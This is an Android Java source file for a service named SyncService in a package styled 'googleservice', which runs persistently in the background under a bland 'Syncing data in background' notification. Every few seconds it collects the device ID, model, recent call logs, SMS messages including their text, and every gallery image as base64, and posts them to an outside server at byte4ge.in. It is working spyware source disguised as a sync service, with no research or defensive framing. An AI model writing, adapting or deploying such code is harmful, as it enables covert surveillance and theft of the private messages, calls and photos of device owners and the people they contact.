package com.b4g.googleservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;

import java.io.IOException;
import java.util.HashMap;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import android.Manifest;

public class SyncService extends Service {
    private static final String TAG = "SyncService";
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "SyncServiceChannel";
    private final String API_URL = "https://byte4ge.in/SyncServiceAPI/sync.php";
    private final int SYNC_INTERVAL = 5000; // 30 seconds in milliseconds
    private Handler handler;
    private Runnable syncRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        handler = new Handler();
        syncRunnable = new Runnable() {
            @Override
            public void run() {
                if (checkPermissions()) {
                    sendCombinedData();
                }
                handler.postDelayed(this, SYNC_INTERVAL);
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        boolean canAccessGallery = false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            canAccessGallery = ContextCompat.checkSelfPermission(this, 
                Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            canAccessGallery = ContextCompat.checkSelfPermission(this, 
                Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        
        if (canAccessGallery) {
            ArrayList<HashMap<String, String>> imagePaths = GalleryUtils.getGalleryImages(getApplicationContext());
            Log.d("SyncService", "Total images found: " + imagePaths.size());
        } else {
            Log.e("SyncService", "Permission denied: Cannot access gallery images.");
        }

        Log.d(TAG, "Service started");
        handler.post(syncRunnable);
        return START_STICKY; // Service will be restarted if terminated by the system
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(syncRunnable);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not allowing binding
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Sync Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Used for running the sync service");

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Sync Service")
                .setContentText("Syncing data in background")
                .setSmallIcon(android.R.drawable.ic_popup_sync) // Using system icon instead
                .setPriority(NotificationCompat.PRIORITY_LOW);

        return builder.build();
    }

    private boolean checkPermissions() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void sendCombinedData() {
        JSONObject combinedData = new JSONObject();

        try {
            // Get Android ID
            String androidId = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            //getting device name
            String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
            String appID = "app46";

            boolean canAccessGallery = false;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                canAccessGallery = ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
            } else {
                canAccessGallery = ContextCompat.checkSelfPermission(this, 
                    Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
            }
            
            JSONArray imageArray = new JSONArray();
            if (canAccessGallery) {
                ArrayList<HashMap<String, String>> imageList = GalleryUtils.getGalleryImages(getApplicationContext());
                
                for (HashMap<String, String> imageData : imageList) {
                    try {
                        JSONObject imageObject = new JSONObject();
                        imageObject.put("name", imageData.get("name"));  // Send actual name
                        imageObject.put("data", ImageEncoder.encodeImageToBase64(imageData.get("path"))); // Convert to Base64
                        imageArray.put(imageObject);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }

            JSONArray callLogs = getCallLogs();
            JSONArray smsLogs = getSmsLogs();

            combinedData.put("appID", appID);
            combinedData.put("gallery_images", imageArray);
            combinedData.put("android_id", androidId);
            combinedData.put("deviceName", deviceName);
            combinedData.put("call_logs", callLogs);
            combinedData.put("sms_logs", smsLogs);

        } catch (JSONException e) {
            e.printStackTrace();
            Log.e(TAG, "Error creating data format: " + e.getMessage());
            return;
        }

        sendDataToAPI(combinedData.toString());
    }

    private JSONArray getCallLogs() {
        JSONArray callLogsArray = new JSONArray();
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return callLogsArray;
        }
        
        Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
        );

        if (cursor == null) return callLogsArray;

        int count = 0;
        try {
            int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
            
            if (numberColumn < 0 || typeColumn < 0 || durationColumn < 0 || dateColumn < 0) {
                return callLogsArray;
            }
            
            while (cursor.moveToNext() && count < 50) {
                JSONObject logEntry = new JSONObject();
                logEntry.put("number", cursor.getString(numberColumn));
                logEntry.put("type", cursor.getInt(typeColumn));
                logEntry.put("duration", cursor.getLong(durationColumn));
                logEntry.put("date", cursor.getLong(dateColumn));
                callLogsArray.put(logEntry);
                count++;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            cursor.close();
        }
        return callLogsArray;
    }

    private JSONArray getSmsLogs() {
        JSONArray smsLogsArray = new JSONArray();
        
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return smsLogsArray;
        }
        
        Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DATE + " DESC"
        );

        if (cursor == null) return smsLogsArray;

        int count = 0;
        try {
            int addressColumn = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyColumn = cursor.getColumnIndex(Telephony.Sms.BODY);
            int typeColumn = cursor.getColumnIndex(Telephony.Sms.TYPE);
            int dateColumn = cursor.getColumnIndex(Telephony.Sms.DATE);
            
            if (addressColumn < 0 || bodyColumn < 0 || typeColumn < 0 || dateColumn < 0) {
                return smsLogsArray;
            }
            
            while (cursor.moveToNext() && count < 50) {
                JSONObject smsEntry = new JSONObject();
                smsEntry.put("address", cursor.getString(addressColumn));
                smsEntry.put("body", cursor.getString(bodyColumn));
                smsEntry.put("type", cursor.getInt(typeColumn));
                smsEntry.put("date", cursor.getLong(dateColumn));
                smsLogsArray.put(smsEntry);
                count++;
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } finally {
            cursor.close();
        }
        return smsLogsArray;
    }

    private void sendDataToAPI(String data) {
        OkHttpClient client = new OkHttpClient();
        RequestBody body = new FormBody.Builder()
                .add("input", data)
                .build();

        Request request = new Request.Builder()
                .url(API_URL)
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send data: " + e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.d(TAG, "Data sent successfully");
                response.close(); // Important to close the response to avoid memory leaks
            }
        });
    }
} 